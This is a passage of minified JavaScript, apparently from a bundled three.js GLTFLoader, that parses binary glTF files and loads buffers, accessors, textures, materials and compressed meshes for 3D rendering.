                        var t = new Image;
                        t.src = "data:image/webp;base64,UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEADsD+JaQAA3AAAAAA", t.onload = t.onerror = function() { e(1 === t.height) }
                    }))), this.isSupported
                }, c.prototype.loadBufferView = function(e) {
                    var t = this.parser.json,
                        n = t.bufferViews[e];
                    if (n.extensions && n.extensions[this.name]) {
                        var i = n.extensions[this.name],
                            r = this.parser.getDependency("buffer", i.buffer),
                            a = this.parser.options.meshoptDecoder;
                        if (!a || !a.supported) { if (t.extensionsRequired && t.extensionsRequired.indexOf(this.name) >= 0) throw new Error("THREE.GLTFLoader: setMeshoptDecoder must be called before loading compressed files"); return null }
                        return Promise.all([r, a.ready]).then((function(e) {
                            var t = i.byteOffset || 0,
                                n = i.byteLength || 0,
                                r = i.count,
                                o = i.byteStride,
                                s = new ArrayBuffer(r * o),
                                l = new Uint8Array(e[0], t, n);
                            return a.decodeGltfBuffer(new Uint8Array(s), r, o, l, i.mode, i.filter), s
                        }))
                    }
                    return null
                };
                var u = "glTF",
                    h = 1313821514,
                    d = 5130562;

                function p(e) {
                    this.name = n.KHR_BINARY_GLTF, this.content = null, this.body = null;
                    var t = new DataView(e, 0, 12);
                    if (this.header = { magic: Ho(new Uint8Array(e.slice(0, 4))), version: t.getUint32(4, !0), length: t.getUint32(8, !0) }, this.header.magic !== u) throw new Error("THREE.GLTFLoader: Unsupported glTF-Binary header.");
                    if (this.header.version < 2) throw new Error("THREE.GLTFLoader: Legacy binary file detected.");
                    for (var i = this.header.length - 12, r = new DataView(e, 12), a = 0; a < i;) {
                        var o = r.getUint32(a, !0);
                        a += 4;
                        var s = r.getUint32(a, !0);
                        if (a += 4, s === h) {
                            var l = new Uint8Array(e, 12 + a, o);
                            this.content = Ho(l)
                        } else if (s === d) {
                            var c = 12 + a;
                            this.body = e.slice(c, c + o)
                        }
                        a += o
                    }
                    if (null === this.content) throw new Error("THREE.GLTFLoader: JSON content not found.")
                }

                function f(e, t) {
                    if (!t) throw new Error("THREE.GLTFLoader: No DRACOLoader instance provided.");
                    this.name = n.KHR_DRACO_MESH_COMPRESSION, this.json = e, this.dracoLoader = t, this.dracoLoader.preload()
                }

                function m() { this.name = n.KHR_TEXTURE_TRANSFORM }

                function g(e) {
                    Wa.call(this), this.isGLTFSpecularGlossinessMaterial = !0;
                    var t = ["#ifdef USE_SPECULARMAP", "\tuniform sampler2D specularMap;", "#endif"].join("\n"),
                        n = ["#ifdef USE_GLOSSINESSMAP", "\tuniform sampler2D glossinessMap;", "#endif"].join("\n"),
                        i = ["vec3 specularFactor = specular;", "#ifdef USE_SPECULARMAP", "\tvec4 texelSpecular = texture2D( specularMap, vUv );", "\ttexelSpecular = sRGBToLinear( texelSpecular );", "\t// reads channel RGB, compatible with a glTF Specular-Glossiness (RGBA) texture", "\tspecularFactor *= texelSpecular.rgb;", "#endif"].join("\n"),
                        r = ["float glossinessFactor = glossiness;", "#ifdef USE_GLOSSINESSMAP", "\tvec4 texelGlossiness = texture2D( glossinessMap, vUv );", "\t// reads channel A, compatible with a glTF Specular-Glossiness (RGBA) texture", "\tglossinessFactor *= texelGlossiness.a;", "#endif"].join("\n"),
                        a = ["PhysicalMaterial material;", "material.diffuseColor = diffuseColor.rgb * ( 1. - max( specularFactor.r, max( specularFactor.g, specularFactor.b ) ) );", "vec3 dxy = max( abs( dFdx( geometryNormal ) ), abs( dFdy( geometryNormal ) ) );", "float geometryRoughness = max( max( dxy.x, dxy.y ), dxy.z );", "material.specularRoughness = max( 1.0 - glossinessFactor, 0.0525 ); // 0.0525 corresponds to the base mip of a 256 cubemap.", "material.specularRoughness += geometryRoughness;", "material.specularRoughness = min( material.specularRoughness, 1.0 );", "material.specularColor = specularFactor;"].join("\n"),
                        o = { specular: { value: (new Wt).setHex(16777215) }, glossiness: { value: 1 }, specularMap: { value: null }, glossinessMap: { value: null } };
                    this._extraUniforms = o, this.onBeforeCompile = function(e) {
                        for (var s in o) e.uniforms[s] = o[s];
                        e.fragmentShader = e.fragmentShader.replace("uniform float roughness;", "uniform vec3 specular;").replace("uniform float metalness;", "uniform float glossiness;").replace("#include <roughnessmap_pars_fragment>", t).replace("#include <metalnessmap_pars_fragment>", n).replace("#include <roughnessmap_fragment>", i).replace("#include <metalnessmap_fragment>", r).replace("#include <lights_physical_fragment>", a)
                    }, Object.defineProperties(this, { specular: { get: function() { return o.specular.value }, set: function(e) { o.specular.value = e } }, specularMap: { get: function() { return o.specularMap.value }, set: function(e) { o.specularMap.value = e, e ? this.defines.USE_SPECULARMAP = "" : delete this.defines.USE_SPECULARMAP } }, glossiness: { get: function() { return o.glossiness.value }, set: function(e) { o.glossiness.value = e } }, glossinessMap: { get: function() { return o.glossinessMap.value }, set: function(e) { o.glossinessMap.value = e, e ? (this.defines.USE_GLOSSINESSMAP = "", this.defines.USE_UV = "") : (delete this.defines.USE_GLOSSINESSMAP, delete this.defines.USE_UV) } } }), delete this.metalness, delete this.roughness, delete this.metalnessMap, delete this.roughnessMap, this.setValues(e)
                }

                function v() {
                    return {
                        name: n.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS,
                        specularGlossinessParams: ["color", "map", "lightMap", "lightMapIntensity", "aoMap", "aoMapIntensity", "emissive", "emissiveIntensity", "emissiveMap", "bumpMap", "bumpScale", "normalMap", "normalMapType", "displacementMap", "displacementScale", "displacementBias", "specularMap", "specular", "glossinessMap", "glossiness", "alphaMap", "envMap", "envMapIntensity", "refractionRatio"],
                        getMaterialType: function() { return g },
                        extendParams: function(e, t, n) {
                            var i = t.extensions[this.name];
                            e.color = new Wt(1, 1, 1), e.opacity = 1;
                            var r = [];
                            if (Array.isArray(i.diffuseFactor)) {
                                var a = i.diffuseFactor;
                                e.color.fromArray(a), e.opacity = a[3]
                            }
                            if (void 0 !== i.diffuseTexture && r.push(n.assignTexture(e, "map", i.diffuseTexture)), e.emissive = new Wt(0, 0, 0), e.glossiness = void 0 !== i.glossinessFactor ? i.glossinessFactor : 1, e.specular = new Wt(1, 1, 1), Array.isArray(i.specularFactor) && e.specular.fromArray(i.specularFactor), void 0 !== i.specularGlossinessTexture) {
                                var o = i.specularGlossinessTexture;
                                r.push(n.assignTexture(e, "glossinessMap", o)), r.push(n.assignTexture(e, "specularMap", o))
                            }
                            return Promise.all(r)
                        },
                        createMaterial: function(e) { var t = new g(e); return t.fog = !0, t.color = e.color, t.map = void 0 === e.map ? null : e.map, t.lightMap = null, t.lightMapIntensity = 1, t.aoMap = void 0 === e.aoMap ? null : e.aoMap, t.aoMapIntensity = 1, t.emissive = e.emissive, t.emissiveIntensity = 1, t.emissiveMap = void 0 === e.emissiveMap ? null : e.emissiveMap, t.bumpMap = void 0 === e.bumpMap ? null : e.bumpMap, t.bumpScale = 1, t.normalMap = void 0 === e.normalMap ? null : e.normalMap, t.normalMapType = 0, e.normalScale && (t.normalScale = e.normalScale), t.displacementMap = null, t.displacementScale = 1, t.displacementBias = 0, t.specularMap = void 0 === e.specularMap ? null : e.specularMap, t.specular = e.specular, t.glossinessMap = void 0 === e.glossinessMap ? null : e.glossinessMap, t.glossiness = e.glossiness, t.alphaMap = null, t.envMap = void 0 === e.envMap ? null : e.envMap, t.envMapIntensity = 1, t.refractionRatio = .98, t }
                    }
                }

                function y() { this.name = n.KHR_MESH_QUANTIZATION }

                function x(e, t, n, i) { Ya.call(this, e, t, n, i) }
                f.prototype.decodePrimitive = function(e, t) {
                    var n = this.json,
                        i = this.dracoLoader,
                        r = e.extensions[this.name].bufferView,
                        a = e.extensions[this.name].attributes,
                        o = {},
                        s = {},
                        l = {};
                    for (var c in a) {
                        var u = C[c] || c.toLowerCase();
                        o[u] = a[c]
                    }
                    for (c in e.attributes)
                        if (u = C[c] || c.toLowerCase(), void 0 !== a[c]) {
                            var h = n.accessors[e.attributes[c]],
                                d = L[h.componentType];
                            l[u] = d, s[u] = !0 === h.normalized
                        }
                    return t.getDependency("bufferView", r).then((function(e) {
                        return new Promise((function(t) {
                            i.decodeDracoFile(e, (function(e) {
                                for (var n in e.attributes) {
                                    var i = e.attributes[n],
                                        r = s[n];
                                    void 0 !== r && (i.normalized = r)
                                }
                                t(e)
                            }), o, l)
                        }))
                    }))
                }, m.prototype.extendTexture = function(e, t) { return e = e.clone(), void 0 !== t.offset && e.offset.fromArray(t.offset), void 0 !== t.rotation && (e.rotation = t.rotation), void 0 !== t.scale && e.repeat.fromArray(t.scale), void 0 !== t.texCoord && console.warn('THREE.GLTFLoader: Custom UV sets in "' + this.name + '" extension not yet supported.'), e.needsUpdate = !0, e }, g.prototype = Object.create(Wa.prototype), g.prototype.constructor = g, g.prototype.copy = function(e) { return Wa.prototype.copy.call(this, e), this.specularMap = e.specularMap, this.specular.copy(e.specular), this.glossinessMap = e.glossinessMap, this.glossiness = e.glossiness, delete this.metalness, delete this.roughness, delete this.metalnessMap, delete this.roughnessMap, this }, x.prototype = Object.create(Ya.prototype), x.prototype.constructor = x, x.prototype.copySampleValue_ = function(e) { for (var t = this.resultBuffer, n = this.sampleValues, i = this.valueSize, r = e * i * 3 + i, a = 0; a !== i; a++) t[a] = n[r + a]; return t }, x.prototype.beforeStart_ = x.prototype.copySampleValue_, x.prototype.afterEnd_ = x.prototype.copySampleValue_, x.prototype.interpolate_ = function(e, t, n, i) {
                    for (var r = this.resultBuffer, a = this.sampleValues, o = this.valueSize, s = 2 * o, l = 3 * o, c = i - t, u = (n - t) / c, h = u * u, d = h * u, p = e * l, f = p - l, m = -2 * d + 3 * h, g = d - h, v = 1 - m, y = g - h + u, x = 0; x !== o; x++) {
                        var _ = a[f + x + o],
                            b = a[f + x + s] * c,
                            w = a[p + x + o],
                            M = a[p + x] * c;
                        r[x] = v * _ + y * b + m * w + g * M
                    }
                    return r
                };
                var L = { 5120: Int8Array, 5121: Uint8Array, 5122: Int16Array, 5123: Uint16Array, 5125: Uint32Array, 5126: Float32Array },
                    A = { 9728: U, 9729: B, 9984: F, 9985: 1007, 9986: z, 9987: G },
                    R = { 33071: O, 33648: H, 10497: I },
                    P = { SCALAR: 1, VEC2: 2, VEC3: 3, VEC4: 4, MAT2: 4, MAT3: 9, MAT4: 16 },
                    C = { POSITION: "position", NORMAL: "normal", TANGENT: "tangent", TEXCOORD_0: "uv", TEXCOORD_1: "uv2", COLOR_0: "color", WEIGHTS_0: "skinWeight", JOINTS_0: "skinIndex" },
                    D = { scale: "scale", translation: "position", rotation: "quaternion", weights: "morphTargetInfluences" },
                    N = { CUBICSPLINE: void 0, LINEAR: Q, STEP: $ };

                function j(e, t) { return "string" != typeof e || "" === e ? "" : (/^https?:\/\//i.test(t) && /^\//.test(e) && (t = t.replace(/(^https?:\/\/[^\/]+).*/i, "$1")), /^(https?:)?\/\//i.test(e) || /^data:.*,.*$/i.test(e) || /^blob:.*$/i.test(e) ? e : t + e) }

                function q(e, t, n) { for (var i in n.extensions) void 0 === e[i] && (t.userData.gltfExtensions = t.userData.gltfExtensions || {}, t.userData.gltfExtensions[i] = n.extensions[i]) }

                function X(e, t) { void 0 !== t.extras && ("object" == typeof t.extras ? Object.assign(e.userData, t.extras) : console.warn("THREE.GLTFLoader: Ignoring primitive type .extras, " + t.extras)) }

                function Z(e, t) {
                    if (e.updateMorphTargets(), void 0 !== t.weights)
                        for (var n = 0, i = t.weights.length; n < i; n++) e.morphTargetInfluences[n] = t.weights[n];
                    if (t.extras && Array.isArray(t.extras.targetNames)) {
                        var r = t.extras.targetNames;
                        if (e.morphTargetInfluences.length === r.length)
                            for (e.morphTargetDictionary = {}, n = 0, i = r.length; n < i; n++) e.morphTargetDictionary[r[n]] = n;
                        else console.warn("THREE.GLTFLoader: Invalid extras.targetNames length. Ignoring names.")
                    }
                }

                function J(e) { for (var t = "", n = Object.keys(e).sort(), i = 0, r = n.length; i < r; i++) t += n[i] + ":" + e[n[i]] + ";"; return t }

                function K(e, n) { this.json = e || {}, this.extensions = {}, this.plugins = {}, this.options = n || {}, this.cache = new t, this.associations = new Map, this.primitiveCache = {}, this.meshCache = { refs: {}, uses: {} }, this.cameraCache = { refs: {}, uses: {} }, this.lightCache = { refs: {}, uses: {} }, this.nodeNamesUsed = {}, "undefined" != typeof createImageBitmap && !1 === /Firefox/.test(navigator.userAgent) ? this.textureLoader = new Bo(this.options.manager) : this.textureLoader = new yo(this.options.manager), this.textureLoader.setCrossOrigin(this.options.crossOrigin), this.textureLoader.setRequestHeader(this.options.requestHeader), this.fileLoader = new po(this.options.manager), this.fileLoader.setResponseType("arraybuffer"), "use-credentials" === this.options.crossOrigin && this.fileLoader.setWithCredentials(!0) }

                function ee(e, t, n) {
                    var i = t.attributes,
                        r = [];

                    function a(t, i) { return n.getDependency("accessor", t).then((function(t) { e.setAttribute(i, t) })) }
                    for (var o in i) {
                        var s = C[o] || o.toLowerCase();
                        s in e.attributes || r.push(a(i[o], s))
                    }
                    if (void 0 !== t.indices && !e.index) {
                        var l = n.getDependency("accessor", t.indices).then((function(t) { e.setIndex(t) }));
                        r.push(l)
                    }
                    return X(e, t),
                        function(e, t, n) {
                            var i = t.attributes,
                                r = new Te;
                            if (void 0 !== i.POSITION) {
                                var a = (d = n.json.accessors[i.POSITION]).min,
                                    o = d.max;
                                if (void 0 !== a && void 0 !== o) {
                                    r.set(new be(a[0], a[1], a[2]), new be(o[0], o[1], o[2]));
                                    var s = t.targets;
                                    if (void 0 !== s) {
                                        for (var l = new be, c = new be, u = 0, h = s.length; u < h; u++) {
                                            var d, p = s[u];
                                            void 0 !== p.POSITION && (a = (d = n.json.accessors[p.POSITION]).min, o = d.max, void 0 !== a && void 0 !== o ? (c.setX(Math.max(Math.abs(a[0]), Math.abs(o[0]))), c.setY(Math.max(Math.abs(a[1]), Math.abs(o[1]))), c.setZ(Math.max(Math.abs(a[2]), Math.abs(o[2]))), l.max(c)) : console.warn("THREE.GLTFLoader: Missing min/max properties for accessor POSITION."))
                                        }
                                        r.expandByVector(l)
                                    }
                                    e.boundingBox = r;
                                    var f = new Be;
                                    r.getCenter(f.center), f.radius = r.min.distanceTo(r.max) / 2, e.boundingSphere = f
                                } else console.warn("THREE.GLTFLoader: Missing min/max properties for accessor POSITION.")
                            }
                        }(e, t, n), Promise.all(r).then((function() {
                            return void 0 !== t.targets ? function(e, t, n) {
                                for (var i = !1, r = !1, a = 0, o = t.length; a < o && (void 0 !== (c = t[a]).POSITION && (i = !0), void 0 !== c.NORMAL && (r = !0), !i || !r); a++);
                                if (!i && !r) return Promise.resolve(e);
                                var s = [],
                                    l = [];
                                for (a = 0, o = t.length; a < o; a++) {
                                    var c = t[a];
                                    if (i) {
                                        var u = void 0 !== c.POSITION ? n.getDependency("accessor", c.POSITION) : e.attributes.position;
                                        s.push(u)
                                    }
                                    r && (u = void 0 !== c.NORMAL ? n.getDependency("accessor", c.NORMAL) : e.attributes.normal, l.push(u))
                                }
                                return Promise.all([Promise.all(s), Promise.all(l)]).then((function(t) {
                                    var n = t[0],
                                        a = t[1];
                                    return i && (e.morphAttributes.position = n), r && (e.morphAttributes.normal = a), e.morphTargetsRelative = !0, e
                                }))
                            }(e, t.targets, n) : e
                        }))
                }

                function te(e, t) {
                    var n = e.getIndex();
                    if (null === n) {
                        var i = [],
                            r = e.getAttribute("position");
                        if (void 0 === r) return console.error("THREE.GLTFLoader.toTrianglesDrawMode(): Undefined position attribute. Processing not possible."), e;
                        for (var a = 0; a < r.count; a++) i.push(a);
                        e.setIndex(i), n = e.getIndex()
                    }
                    var o = n.count - 2,
                        s = [];
                    if (2 === t)
                        for (a = 1; a <= o; a++) s.push(n.getX(0)), s.push(n.getX(a)), s.push(n.getX(a + 1));
                    else
                        for (a = 0; a < o; a++) a % 2 == 0 ? (s.push(n.getX(a)), s.push(n.getX(a + 1)), s.push(n.getX(a + 2))) : (s.push(n.getX(a + 2)), s.push(n.getX(a + 1)), s.push(n.getX(a)));
                    s.length / 3 !== o && console.error("THREE.GLTFLoader.toTrianglesDrawMode(): Unable to generate correct amount of triangles.");
                    var l = e.clone();
                    return l.setIndex(s), l
                }
                return K.prototype.setExtensions = function(e) { this.extensions = e }, K.prototype.setPlugins = function(e) { this.plugins = e }, K.prototype.parse = function(e, t) {
                    var n = this,
                        i = this.json,
                        r = this.extensions;
                    this.cache.removeAll(), this._invokeAll((function(e) { return e._markDefs && e._markDefs() })), Promise.all(this._invokeAll((function(e) { return e.beforeRoot && e.beforeRoot() }))).then((function() { return Promise.all([n.getDependencies("scene"), n.getDependencies("animation"), n.getDependencies("camera")]) })).then((function(t) {
                        var a = { scene: t[0][i.scene || 0], scenes: t[0], animations: t[1], cameras: t[2], asset: i.asset, parser: n, userData: {} };
                        q(r, a, i), X(a, i), Promise.all(n._invokeAll((function(e) { return e.afterRoot && e.afterRoot(a) }))).then((function() { e(a) }))
                    })).catch(t)
                }, K.prototype._markDefs = function() {
                    for (var e = this.json.nodes || [], t = this.json.skins || [], n = this.json.meshes || [], i = 0, r = t.length; i < r; i++)
                        for (var a = t[i].joints, o = 0, s = a.length; o < s; o++) e[a[o]].isBone = !0;
                    for (var l = 0, c = e.length; l < c; l++) {
                        var u = e[l];
                        void 0 !== u.mesh && (this._addNodeRef(this.meshCache, u.mesh), void 0 !== u.skin && (n[u.mesh].isSkinnedMesh = !0)), void 0 !== u.camera && this._addNodeRef(this.cameraCache, u.camera)
                    }
                }, K.prototype._addNodeRef = function(e, t) { void 0 !== t && (void 0 === e.refs[t] && (e.refs[t] = e.uses[t] = 0), e.refs[t]++) }, K.prototype._getNodeRef = function(e, t, n) { if (e.refs[t] <= 1) return n; var i = n.clone(); return i.name += "_instance_" + e.uses[t]++, i }, K.prototype._invokeOne = function(e) {
                    var t = Object.values(this.plugins);
                    t.push(this);
                    for (var n = 0; n < t.length; n++) { var i = e(t[n]); if (i) return i }
                }, K.prototype._invokeAll = function(e) {
                    var t = Object.values(this.plugins);
                    t.unshift(this);
                    for (var n = [], i = 0; i < t.length; i++) {
                        var r = e(t[i]);
                        r && n.push(r)
                    }
                    return n
                }, K.prototype.getDependency = function(e, t) {
                    var n = e + ":" + t,
                        i = this.cache.get(n);
                    if (!i) {
                        switch (e) {
                            case "scene":
                                i = this.loadScene(t);
                                break;
                            case "node":
                                i = this.loadNode(t);
                                break;
                            case "mesh":
                                i = this._invokeOne((function(e) { return e.loadMesh && e.loadMesh(t) }));
                                break;
                            case "accessor":
                                i = this.loadAccessor(t);
                                break;
                            case "bufferView":
                                i = this._invokeOne((function(e) { return e.loadBufferView && e.loadBufferView(t) }));
                                break;
                            case "buffer":
                                i = this.loadBuffer(t);
                                break;
                            case "material":
                                i = this._invokeOne((function(e) { return e.loadMaterial && e.loadMaterial(t) }));
                                break;
                            case "texture":
                                i = this._invokeOne((function(e) { return e.loadTexture && e.loadTexture(t) }));
                                break;
                            case "skin":
                                i = this.loadSkin(t);
                                break;
                            case "animation":
                                i = this.loadAnimation(t);
                                break;
                            case "camera":
                                i = this.loadCamera(t);
                                break;
                            default:
                                throw new Error("Unknown type: " + e)
                        }
                        this.cache.add(n, i)
                    }
                    return i
                }, K.prototype.getDependencies = function(e) {
                    var t = this.cache.get(e);
                    if (!t) {
                        var n = this,
                            i = this.json[e + ("mesh" === e ? "es" : "s")] || [];
                        t = Promise.all(i.map((function(t, i) { return n.getDependency(e, i) }))), this.cache.add(e, t)
                    }
                    return t
                }, K.prototype.loadBuffer = function(e) {
                    var t = this.json.buffers[e],
                        i = this.fileLoader;
                    if (t.type && "arraybuffer" !== t.type) throw new Error("THREE.GLTFLoader: " + t.type + " buffer type is not supported.");
                    if (void 0 === t.uri && 0 === e) return Promise.resolve(this.extensions[n.KHR_BINARY_GLTF].body);
                    var r = this.options;
                    return new Promise((function(e, n) { i.load(j(t.uri, r.path), e, void 0, (function() { n(new Error('THREE.GLTFLoader: Failed to load buffer "' + t.uri + '".')) })) }))
                }, K.prototype.loadBufferView = function(e) {
                    var t = this.json.bufferViews[e];
                    return this.getDependency("buffer", t.buffer).then((function(e) {
                        var n = t.byteLength || 0,
                            i = t.byteOffset || 0;
                        return e.slice(i, i + n)
                    }))
                }, K.prototype.loadAccessor = function(e) {
                    var t = this,
                        n = this.json,
                        i = this.json.accessors[e];
                    if (void 0 === i.bufferView && void 0 === i.sparse) return Promise.resolve(null);
                    var r = [];
                    return void 0 !== i.bufferView ? r.push(this.getDependency("bufferView", i.bufferView)) : r.push(null), void 0 !== i.sparse && (r.push(this.getDependency("bufferView", i.sparse.indices.bufferView)), r.push(this.getDependency("bufferView", i.sparse.values.bufferView))), Promise.all(r).then((function(e) {
                        var r, a = e[0],
                            o = P[i.type],
                            s = L[i.componentType],
                            l = s.BYTES_PER_ELEMENT,
                            c = l * o,
                            u = i.byteOffset || 0,
                            h = void 0 !== i.bufferView ? n.bufferViews[i.bufferView].byteStride : void 0,
                            d = !0 === i.normalized;
                        if (h && h !== c) {
                            var p = Math.floor(u / h),
                                f = "InterleavedBuffer:" + i.bufferView + ":" + i.componentType + ":" + p + ":" + i.count,
                                m = t.cache.get(f);
                            m || (m = new ia(new s(a, p * h, i.count * h / l), h / l), t.cache.add(f, m)), r = new aa(m, o, u % h / l, d)
                        } else r = new Yt(null === a ? new s(i.count * o) : new s(a, u, i.count * o), o, d);
                        if (void 0 !== i.sparse) {
                            var g = P.SCALAR,
                                v = L[i.sparse.indices.componentType],
                                y = i.sparse.indices.byteOffset || 0,
                                x = i.sparse.values.byteOffset || 0,
                                _ = new v(e[1], y, i.sparse.count * g),
                                b = new s(e[2], x, i.sparse.count * o);
                            null !== a && (r = new Yt(r.array.slice(), r.itemSize, r.normalized));
                            for (var w = 0, M = _.length; w < M; w++) { var T = _[w]; if (r.setX(T, b[w * o]), o >= 2 && r.setY(T, b[w * o + 1]), o >= 3 && r.setZ(T, b[w * o + 2]), o >= 4 && r.setW(T, b[w * o + 3]), o >= 5) throw new Error("THREE.GLTFLoader: Unsupported itemSize in sparse BufferAttribute.") }
                        }
                        return r
                    }))
                }, K.prototype.loadTexture = function(e) {
                    var t = this.json,
                        n = this.options,
                        i = t.textures[e],
                        r = t.images[i.source],
                        a = this.textureLoader;
                    if (r.uri) {
                        var o = n.manager.getHandler(r.uri);
                        null !== o && (a = o)
                    }
                    return this.loadTextureImage(e, r, a)
                }, K.prototype.loadTextureImage = function(e, t, n) {
                    var i = this,
                        r = this.json,
                        a = this.options,
                        o = r.textures[e],
                        s = self.URL || self.webkitURL,
                        l = t.uri,
                        c = !1,
                        u = !0;
                    if ("image/jpeg" === t.mimeType && (u = !1), void 0 !== t.bufferView) l = i.getDependency("bufferView", t.bufferView).then((function(e) {
                        if ("image/png" === t.mimeType) {
                            var n = new DataView(e, 25, 1).getUint8(0, !1);
                            u = 6 === n || 4 === n || 3 === n
                        }
                        c = !0;
                        var i = new Blob([e], { type: t.mimeType });
                        return l = s.createObjectURL(i)
                    }));
                    else if (void 0 === t.uri) throw new Error("THREE.GLTFLoader: Image " + e + " is missing URI and bufferView");
                    return Promise.resolve(l).then((function(e) { return new Promise((function(t, i) { var r = t;!0 === n.isImageBitmapLoader && (r = function(e) { t(new ka(e)) }), n.load(j(e, a.path), r, void 0, i) })) })).then((function(t) {!0 === c && s.revokeObjectURL(l), t.flipY = !1, o.name && (t.name = o.name), u || (t.format = Y); var n = (r.samplers || {})[o.sampler] || {}; return t.magFilter = A[n.magFilter] || B, t.minFilter = A[n.minFilter] || G, t.wrapS = R[n.wrapS] || I, t.wrapT = R[n.wrapT] || I, i.associations.set(t, { type: "textures", index: e }), t }))
                }, K.prototype.assignTexture = function(e, t, i) {
                    var r = this;
                    return this.getDependency("texture", i.index).then((function(a) {
                        if (void 0 === i.texCoord || 0 == i.texCoord || "aoMap" === t && 1 == i.texCoord || console.warn("THREE.GLTFLoader: Custom UV set " + i.texCoord + " for texture " + t + " not yet supported."), r.extensions[n.KHR_TEXTURE_TRANSFORM]) {
                            var o = void 0 !== i.extensions ? i.extensions[n.KHR_TEXTURE_TRANSFORM] : void 0;
                            if (o) {
                                var s = r.associations.get(a);
                                a = r.extensions[n.KHR_TEXTURE_TRANSFORM].extendTexture(a, o), r.associations.set(a, s)
                            }
                        }
                        e[t] = a
                    }))
                }, K.prototype.assignFinalMaterial = function(e) {
                    var t = e.geometry,
                        n = e.material,
                        i = void 0 !== t.attributes.tangent,
                        r = void 0 !== t.attributes.color,
                        a = void 0 === t.attributes.normal,
                        o = !0 === e.isSkinnedMesh,
                        s = Object.keys(t.morphAttributes).length > 0,
                        l = s && void 0 !== t.morphAttributes.normal;
                    if (e.isPoints) {
                        var c = "PointsMaterial:" + n.uuid,
                            u = this.cache.get(c);
                        u || (u = new Ia, Ut.prototype.copy.call(u, n), u.color.copy(n.color), u.map = n.map, u.sizeAttenuation = !1, this.cache.add(c, u)), n = u
                    } else if (e.isLine) {
                        c = "LineBasicMaterial:" + n.uuid;
                        var h = this.cache.get(c);
                        h || (h = new Ma, Ut.prototype.copy.call(h, n), h.color.copy(n.color), this.cache.add(c, h)), n = h
                    }
                    if (i || r || a || o || s) {
                        c = "ClonedMaterial:" + n.uuid + ":", n.isGLTFSpecularGlossinessMaterial && (c += "specular-glossiness:"), o && (c += "skinning:"), i && (c += "vertex-tangents:"), r && (c += "vertex-colors:"), a && (c += "flat-shading:"), s && (c += "morph-targets:"), l && (c += "morph-normals:");
                        var d = this.cache.get(c);
                        d || (d = n.clone(), o && (d.skinning = !0), r && (d.vertexColors = !0), a && (d.flatShading = !0), s && (d.morphTargets = !0), l && (d.morphNormals = !0), i && (d.vertexTangents = !0, d.normalScale && (d.normalScale.y *= -1), d.clearcoatNormalScale && (d.clearcoatNormalScale.y *= -1)), this.cache.add(c, d), this.associations.set(d, this.associations.get(n))), n = d
                    }
                    n.aoMap && void 0 === t.attributes.uv2 && void 0 !== t.attributes.uv && t.setAttribute("uv2", t.attributes.uv), e.material = n
                }, K.prototype.getMaterialType = function() { return Wa }, K.prototype.loadMaterial = function(e) {
                    var t, i = this,
                        r = this.json,
                        a = this.extensions,
                        o = r.materials[e],
                        s = {},
                        l = o.extensions || {},
                        c = [];
                    if (l[n.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS]) {
                        var u = a[n.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS];
                        t = u.getMaterialType(), c.push(u.extendParams(s, o, i))
                    } else if (l[n.KHR_MATERIALS_UNLIT]) {
                        var h = a[n.KHR_MATERIALS_UNLIT];
                        t = h.getMaterialType(), c.push(h.extendParams(s, o, i))
                    } else {
                        var d = o.pbrMetallicRoughness || {};
                        if (s.color = new Wt(1, 1, 1), s.opacity = 1, Array.isArray(d.baseColorFactor)) {
                            var p = d.baseColorFactor;
                            s.color.fromArray(p), s.opacity = p[3]
                        }
                        void 0 !== d.baseColorTexture && c.push(i.assignTexture(s, "map", d.baseColorTexture)), s.metalness = void 0 !== d.metallicFactor ? d.metallicFactor : 1, s.roughness = void 0 !== d.roughnessFactor ? d.roughnessFactor : 1, void 0 !== d.metallicRoughnessTexture && (c.push(i.assignTexture(s, "metalnessMap", d.metallicRoughnessTexture)), c.push(i.assignTexture(s, "roughnessMap", d.metallicRoughnessTexture))), t = this._invokeOne((function(t) { return t.getMaterialType && t.getMaterialType(e) })), c.push(Promise.all(this._invokeAll((function(t) { return t.extendMaterialParams && t.extendMaterialParams(e, s) }))))
                    }!0 === o.doubleSided && (s.side = 2);
                    var f = o.alphaMode || "OPAQUE";
                    return "BLEND" === f ? (s.transparent = !0, s.depthWrite = !1) : (s.transparent = !1, "MASK" === f && (s.alphaTest = void 0 !== o.alphaCutoff ? o.alphaCutoff : .5)), void 0 !== o.normalTexture && t !== jt && (c.push(i.assignTexture(s, "normalMap", o.normalTexture)), s.normalScale = new he(1, -1), void 0 !== o.normalTexture.scale && s.normalScale.set(o.normalTexture.scale, -o.normalTexture.scale)), void 0 !== o.occlusionTexture && t !== jt && (c.push(i.assignTexture(s, "aoMap", o.occlusionTexture)), void 0 !== o.occlusionTexture.strength && (s.aoMapIntensity = o.occlusionTexture.strength)), void 0 !== o.emissiveFactor && t !== jt && (s.emissive = (new Wt).fromArray(o.emissiveFactor)), void 0 !== o.emissiveTexture && t !== jt && c.push(i.assignTexture(s, "emissiveMap", o.emissiveTexture)), Promise.all(c).then((function() { var r; return r = t === g ? a[n.KHR_MATERIALS_PBR_SPECULAR_GLOSSINESS].createMaterial(s) : new t(s), o.name && (r.name = o.name), r.map && (r.map.encoding = ne), r.emissiveMap && (r.emissiveMap.encoding = ne), X(r, o), i.associations.set(r, { type: "materials", index: e }), o.extensions && q(a, r, o), r }))
                }, K.prototype.createUniqueName = function(e) { for (var t = ts.sanitizeNodeName(e || ""), n = t, i = 1; this.nodeNamesUsed[n]; ++i) n = t + "_" + i; return this.nodeNamesUsed[n] = !0, n }, K.prototype.loadGeometries = function(e) {
                    var t = this,
                        i = this.extensions,
                        r = this.primitiveCache;

                    function a(e) { return i[n.KHR_DRACO_MESH_COMPRESSION].decodePrimitive(e, t).then((function(n) { return ee(n, e, t) })) }
                    for (var o, s, l = [], c = 0, u = e.length; c < u; c++) {
                        var h, d = e[c],
                            p = (void 0, (s = (o = d).extensions && o.extensions[n.KHR_DRACO_MESH_COMPRESSION]) ? "draco:" + s.bufferView + ":" + s.indices + ":" + J(s.attributes) : o.indices + ":" + J(o.attributes) + ":" + o.mode),
                            f = r[p];
                        f ? l.push(f.promise) : (h = d.extensions && d.extensions[n.KHR_DRACO_MESH_COMPRESSION] ? a(d) : ee(new fn, d, t), r[p] = { primitive: d, promise: h }, l.push(h))
                    }
                    return Promise.all(l)
                }, K.prototype.loadMesh = function(e) {
